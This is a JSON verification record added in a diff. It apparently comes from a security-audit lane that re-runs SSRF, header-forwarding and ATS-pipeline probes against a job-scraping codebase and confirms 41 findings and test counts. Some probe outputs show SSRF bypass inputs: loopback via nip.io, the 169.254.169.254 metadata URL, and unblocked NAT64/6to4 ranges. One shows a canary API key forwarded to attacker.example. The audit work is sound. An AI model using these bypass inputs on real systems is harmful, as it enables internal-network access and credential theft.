@@ -1,0 +1,386 @@
+{
+ "could_not_run": [],
+ "lane": "C",
+ "sha": "f227fbb",
+ "summary": "Verified 16 in-scope finding rows (C1-C8, C10-C17) plus all 26 floor test files on f227fbb with a clean tree: 41 REPRODUCED, 1 UNCLEAR (C12), 0 NOT-REPRODUCED, 0 could-not-run. Every probe reproduced the report's pasted output, including the SSRF leaks (C1/C2), ATS gating/settled/abort defects (C3-C5), ingest lineage loss (C6), header forwarding (C8) and missing private ranges (C11). All 8 root and 18 worker floor files pass with exactly the report's counts. C12 is UNCLEAR because the fetcher duplication is real but the double-fetch only happens when the worker ATS fetch fails (`if (!rawListing)` at handle-ingest-url.ts:371), not on every /ingest-url.",
+ "verdicts": [
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-ssrf-session.mjs",
+   "id": "C1",
+   "note": "Output matches \u00a74 exactly: raw-fetch paths leak loopback body incl. via redirect; safeFetch blocks; nip.io hosts classify extractable. Matches session.ts:151/:25/:37.",
+   "output_excerpt": "session(no command) loopback ->              {\"mode\":\"fetch\",\"text\":\"PROBE-INTERNAL-SECRET path=/secret\"}\nsession(no command) redirect ->              {\"mode\":\"fetch\",\"text\":\"PROBE-INTERNAL-SECRET path=/secret\"}\nsession(command fails -> fetch_fallback) ->  {\"mode\":\"fetch_fallback\",\"text\":\"PROBE-INTERNAL-SECRET path=/secret\"}\nsafeFetch loopback ->                        \"BLOCKED: Local and private-network scrape targets are not allowed\"\npolicy(http://127.0.0.1/) ->                 \"blocked\"\npolicy(http://127.0.0.1.nip.io/) ->          \"extractable\"\npolicy(http://169.254.169.254.nip.io/) ->    \"extractable\"",
+   "sev": "P0",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" sh .lane-evidence/probes/C-ssrf-browser-command.sh",
+   "id": "C2",
+   "note": "Fake agent-browser received metadata URL via `open` with no validation, exit=0, matching \u00a74.",
+   "output_excerpt": "{\"url\":\"x\",\"text\":\"<p>internal</p>\",\"metadata\":{\"adapter\":\"agent-browser\",...}}\nexit=0\n--- argv seen by agent-browser:\n--json --session job-bored-14761-09f777a3 open http://169.254.169.254/latest/meta-data/\n--json --session job-bored-14761-09f777a3 wait 750\n--json --session job-bored-14761-09f777a3 get html body\n--json --session job-bored-14761-09f777a3 close",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-run-ats-gating.mjs",
+   "id": "C3",
+   "note": "0 detectBoards calls for [workday,smartrecruiters]; run-discovery.ts:470 hard-codes [\"greenhouse\",\"lever\",\"ashby\"].",
+   "output_excerpt": "RUN-07 enabled=[\"workday\",\"smartrecruiters\"] -> detectBoards calls=0 state=?\nRUN-07 enabled=[\"greenhouse\",\"workday\"] -> detectBoards calls=1 state=?",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-run-ats-gating.mjs",
+   "id": "C4",
+   "note": "Throwing board discards sibling (0 leads vs 1 in control); run-discovery.ts:747 uses Promise.all swallowing only TimeoutError; 0 collect*Settled refs in run-discovery.ts.",
+   "output_excerpt": "RUN-10 two greenhouse boards, board B throws -> listJobs calls=2 leadsWritten=0\nRUN-10 warnings: [\"Listing collection failed for greenhouse: Error: board B exploded\",\"Listing collection failed for greenhouse: Error: board B exploded\"]\nRUN-10 control (no board throws) -> listJobs calls=2 leadsWritten=1",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-run-ats-gating.mjs",
+   "id": "C5",
+   "note": "listJobs got undefined signal; 278ms run outlives the 25ms timeout (report: 277ms; timing jitter only).",
+   "output_excerpt": "RUN-11 ATS listJobs received signal=[\"undefined\"] underlying-work-aborted=no signal (run took 278ms)",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-ingest-lineage.mjs",
+   "id": "C6",
+   "note": "Matches \u00a74 exactly: scraper company/location dropped, wrong 'Company page' label, scrapeJobPosting called with 1 arg.",
+   "output_excerpt": "{\"url\":\"https://careers.acme.com/jobs/123\",\"status\":200,\"scraperCompany\":\"Acme Robotics\",\"writtenCompany\":\"Careers\",\"scraperLocation\":\"Berlin, Germany\",\"writtenLocation\":\"\",\"scraperMethod\":\"serpapi-google-jobs\",\"writtenSourceLabel\":\"Company page\",\"scrapeJobPostingArgCount\":[1]}\n{\"url\":\"https://jobs.example-co.com/role/9\",\"status\":200,\"scraperCompany\":\"Example Co\",\"writtenCompany\":\"Jobs\",\"scraperLocation\":\"Remote (US)\",\"writtenLocation\":\"\",\"scraperMethod\":\"json-ld\",\"writtenSourceLabel\":\"Company page\",\"scrapeJobPostingArgCount\":[1]}",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-jobboard-hint-only.mjs",
+   "id": "C7",
+   "note": "All four hosts extractable under write policy but blocked_aggregator at ingest, matching \u00a74.",
+   "output_excerpt": "lnkd.in                            writePolicy=extractable  ingest=blocked_aggregator(linkedin)\nwww.builtinnyc.com                 writePolicy=extractable  ingest=blocked_aggregator(builtin)\nwww.welcometothejungle.com         writePolicy=extractable  ingest=blocked_aggregator(welcome_to_the_jungle)\nwww.jobs2careers.com               writePolicy=extractable  ingest=blocked_aggregator(jobs2careers)",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node .lane-evidence/probes/C-safefetch-redirect-headers.mjs",
+   "id": "C8",
+   "note": "Canary api key, POST method and body all forwarded cross-origin to attacker.example, matching \u00a74.",
+   "output_excerpt": "{\"url\":\"https://generativelanguage.googleapis.com/v1beta/models/x:generateContent\",\"method\":\"POST\",\"apiKeyHeader\":\"probe-canary-key\",\"bodySent\":true}\n{\"url\":\"https://attacker.example/collect\",\"method\":\"POST\",\"apiKeyHeader\":\"probe-canary-key\",\"bodySent\":true}",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types -e \"import('./integrations/browser-use-discovery/src/sources/host-signatures.ts').then(m=>{...ATS_HOST_SIGNATURES filter/test...})\" + read serpapi-google-jobs.ts:585-629",
+   "id": "C10",
+   "note": "/greenhouse/i and /lever(?:\\.co|\\b)/i are unanchored (host-signatures.ts:14-15); clever.com->lever, scam host->greenhouse; both applyUrlPriority (:594) and inferProviderType (:625) test these regexes.",
+   "output_excerpt": "clever.com -> [\"lever\"]\nwww.greenhouse-careers-scam.com -> [\"greenhouse\"]\nboards.greenhouse.io -> [\"greenhouse\"]\napi.lever.co -> [\"lever\"]",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node -e \"import('./server/security-boundaries.mjs').then(m=>[...].forEach(u=>console.log(u,'allowed=',m.validateScrapeTarget(u).ok)))\"",
+   "id": "C11",
+   "note": "All four ranges allowed, matching \u00a74 exactly.",
+   "output_excerpt": "http://[64:ff9b::7f00:1]/ allowed= true\nhttp://[2002:7f00:1::]/ allowed= true\nhttp://198.18.0.1/ allowed= true\nhttp://192.0.0.8/ allowed= true",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "grep -n fetchFromAts|scrapeToRawListing|ats_direct handle-ingest-url.ts; sed -n '332,376p' handle-ingest-url.ts; sed worker vs shared fetchGreenhouseJob",
+   "id": "C12",
+   "note": "Duplication confirmed (both fetchGreenhouseJob hit the same boards-api URL), but 'twice per /ingest-url' is contradicted on the success path: scrapeToRawListing runs only `if (!rawListing)` (:371), so a successful worker ATS fetch is not re-fetched; double fetch happens only when the worker ATS fetch fails.",
+   "output_excerpt": "} else if (classified.kind === \"ats_direct\") {\n  const atsResult = await fetchFromAts(classified, effectiveDependencies);\n  ... else if (atsResult.ok) { rawListing = ...; strategy = \"ats_api\"; }\nif (!rawListing) {\n  const scraped = await scrapeToRawListing(ingestRequest.url, ...);\nworker:  `https://boards-api.greenhouse.io/v1/boards/${slug}/jobs/${jobId}` (ats-public-fetchers.ts:127)\nshared:  `https://boards-api.greenhouse.io/v1/boards/${slug}/jobs/${jobId}` (ats-job-fetchers.mjs:273)",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "UNCLEAR"
+  },
+  {
+   "command": "grep -rn -E \"hasRegisteredAtsExecutionLane|selectRegisteredAtsSources|resolveAtsPublicExecution|fetchAtsJobByRegistry\" integrations server",
+   "id": "C13",
+   "note": "Only hits are the definitions in src/sources/ats-public-fetchers.ts and the test file; no src/ caller exists.",
+   "output_excerpt": "tests/sources/ats-public-fetchers.test.ts:8:  fetchAtsJobByRegistry,\ntests/sources/ats-public-fetchers.test.ts:11:  resolveAtsPublicExecution,\ntests/sources/ats-public-fetchers.test.ts:12:  selectRegisteredAtsSources,\ntests/sources/ats-public-fetchers.test.ts:163,177,184,188,194,200,208 (test-only call sites)\nsrc/sources/ats-public-fetchers.ts:48,71,75,78,100,104 (definitions + internal use only)",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "wc -l server/shared/job-scraper-core.mjs server/shared/ats-job-fetchers.mjs",
+   "id": "C14",
+   "note": "Line counts match \u00a74 exactly.",
+   "output_excerpt": "1747 server/shared/job-scraper-core.mjs\n1217 server/shared/ats-job-fetchers.mjs",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/C-run-ats-gating.mjs + grep F4A-RUN names + floor runs of ats-public-fetchers (8/8) and source-adapters (7/7)",
+   "id": "C15",
+   "note": "Probe shows production broken (C3/C4 lines) while the named tests pass: F4A-RUN07-REG exists (ats-public-fetchers.test.ts:156,183; file 8/8 pass) and F4A-RUN10-SETTLED exists (source-adapters.test.ts:441; file 7/7 pass); run-discovery.ts has 0 collect*Settled references.",
+   "output_excerpt": "RUN-07 enabled=[\"workday\",\"smartrecruiters\"] -> detectBoards calls=0 state=?\nRUN-10 two greenhouse boards, board B throws -> listJobs calls=2 leadsWritten=0\nF4A-RUN07-REG @ ats-public-fetchers.test.ts:156,183 \u2014 file: tests 8 pass 8 fail 0\nF4A-RUN10-SETTLED @ source-adapters.test.ts:441 \u2014 file: tests 7 pass 7 fail 0\ngrep -c collect*Settled run-discovery.ts -> 0",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "sed -n '20,60p' integrations/browser-use-discovery/tests/browser/session.test.ts; grep -n -i \"127.0.0.1|169.254|metadata|private|ssrf|blocked\" session.test.ts",
+   "id": "C16",
+   "note": "session.test.ts:27 pins 'falls back to direct fetch' with stubbed example.com and no SSRF/private-URL assertion; grep shows no private-URL case (127.0.0.1 is only server-host config).",
+   "output_excerpt": "test(\"browser session falls back to direct fetch when no command is configured\", async () => {\n  const url = \"https://example.com/acme-careers\";\n  ... assert.equal(result.metadata.mode, \"fetch\");\ntest(\"browser session times out a hung command and falls back to direct fetch\", ...\ngrep SSRF/private hits in test file: none (only host config + metadata field names)",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "grep -ci workable tests/job-scraper-ats-api.test.mjs; grep -ci <provider> source-adapters.test.ts (x9); grep -n workable|recruitee|personio source-adapters.test.ts",
+   "id": "C17",
+   "note": "workable has 0 mentions in the shared ATS test; the 9 worker providers have exactly 3 mentions each, all (provider,url,canonical-url) triplets in the canonicalize table at :355+.",
+   "output_excerpt": "workable in tests/job-scraper-ats-api.test.mjs -> 0\nicims/jobvite/taleo/successfactors/workable/breezy/recruitee/teamtailor/personio in source-adapters.test.ts -> 3 each\n375-377: \"workable\", \"https://apply.workable.com/acme/j/ABC123/?utm_source=test\", \"https://apply.workable.com/acme/j/ABC123\"",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/job-scraper-ats-api.test.mjs",
+   "id": "TEST:tests/job-scraper-ats-api.test.mjs",
+   "note": "Counts match \u00a74 floor (27/27).",
+   "output_excerpt": "\u2139 tests 27\n\u2139 pass 27\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/safe-fetch-dns-pin.test.mjs",
+   "id": "TEST:tests/safe-fetch-dns-pin.test.mjs",
+   "note": "Counts match \u00a74 floor (6/6).",
+   "output_excerpt": "\u2139 tests 6\n\u2139 pass 6\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/server-security-boundaries.test.mjs",
+   "id": "TEST:tests/server-security-boundaries.test.mjs",
+   "note": "Counts match \u00a74 floor (17/17).",
+   "output_excerpt": "\u2139 tests 17\n\u2139 pass 17\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/job-scraper-linkedin-fallback.test.mjs",
+   "id": "TEST:tests/job-scraper-linkedin-fallback.test.mjs",
+   "note": "Counts match \u00a74 floor (12/12).",
+   "output_excerpt": "\u2139 tests 12\n\u2139 pass 12\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/job-scraper-gemini-url-context.test.mjs",
+   "id": "TEST:tests/job-scraper-gemini-url-context.test.mjs",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/text-normalize.test.mjs",
+   "id": "TEST:tests/text-normalize.test.mjs",
+   "note": "Counts match \u00a74 floor (10/10).",
+   "output_excerpt": "\u2139 tests 10\n\u2139 pass 10\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/scrape-failure-ux.test.mjs",
+   "id": "TEST:tests/scrape-failure-ux.test.mjs",
+   "note": "Counts match \u00a74 floor (25/25).",
+   "output_excerpt": "\u2139 tests 25\n\u2139 pass 25\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/job-scraper-block-text.test.mjs",
+   "id": "TEST:tests/job-scraper-block-text.test.mjs",
+   "note": "Counts match \u00a74 floor (12/12).",
+   "output_excerpt": "\u2139 tests 12\n\u2139 pass 12\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/career-surface-resolver.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/career-surface-resolver.test.ts",
+   "note": "Counts match \u00a74 floor (20/20).",
+   "output_excerpt": "\u2139 tests 20\n\u2139 pass 20\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/company-planner.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/company-planner.test.ts",
+   "note": "Counts match \u00a74 floor (5/5).",
+   "output_excerpt": "\u2139 tests 5\n\u2139 pass 5\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/discovery-memory-store.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/discovery-memory-store.test.ts",
+   "note": "Counts match \u00a74 floor (7/7).",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/frontier-memory.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/frontier-memory.test.ts",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/grounded-search-ats-first.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/grounded-search-ats-first.test.ts",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/grounded-search.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/grounded-search.test.ts",
+   "note": "Counts match \u00a74 floor (52/52).",
+   "output_excerpt": "\u2139 tests 52\n\u2139 pass 52\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/runtime-readiness.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/runtime-readiness.test.ts",
+   "note": "Counts match \u00a74 floor (11/11).",
+   "output_excerpt": "\u2139 tests 11\n\u2139 pass 11\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/selectors.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/selectors.test.ts",
+   "note": "Counts match \u00a74 floor (6/6).",
+   "output_excerpt": "\u2139 tests 6\n\u2139 pass 6\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/session.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/session.test.ts",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/source-adapters-ats-first.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/source-adapters-ats-first.test.ts",
+   "note": "Counts match \u00a74 floor (3/3).",
+   "output_excerpt": "\u2139 tests 3\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/browser/source-adapters.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/browser/source-adapters.test.ts",
+   "note": "Counts match \u00a74 floor (7/7).",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/sources/ats-public-fetchers.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sources/ats-public-fetchers.test.ts",
+   "note": "Counts match \u00a74 floor (8/8).",
+   "output_excerpt": "\u2139 tests 8\n\u2139 pass 8\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/sources/ingest-url-router.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sources/ingest-url-router.test.ts",
+   "note": "Counts match \u00a74 floor (13/13).",
+   "output_excerpt": "\u2139 tests 13\n\u2139 pass 13\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/sources/safe-fetch.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sources/safe-fetch.test.ts",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/sources/serpapi-google-jobs.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sources/serpapi-google-jobs.test.ts",
+   "note": "Counts match \u00a74 floor (11/11).",
+   "output_excerpt": "\u2139 tests 11\n\u2139 pass 11\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/run/run-abort.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/run/run-abort.test.ts",
+   "note": "Counts match \u00a74 floor (2/2).",
+   "output_excerpt": "\u2139 tests 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/run/f4b-named-claims.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/run/f4b-named-claims.test.ts",
+   "note": "Counts match \u00a74 floor (3/3).",
+   "output_excerpt": "\u2139 tests 3\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/webhook/handle-ingest-url.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/webhook/handle-ingest-url.test.ts",
+   "note": "Counts match \u00a74 floor (35/35).",
+   "output_excerpt": "\u2139 tests 35\n\u2139 pass 35\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR-PASS",
+   "verdict": "REPRODUCED"
+  }
+ ]
+}
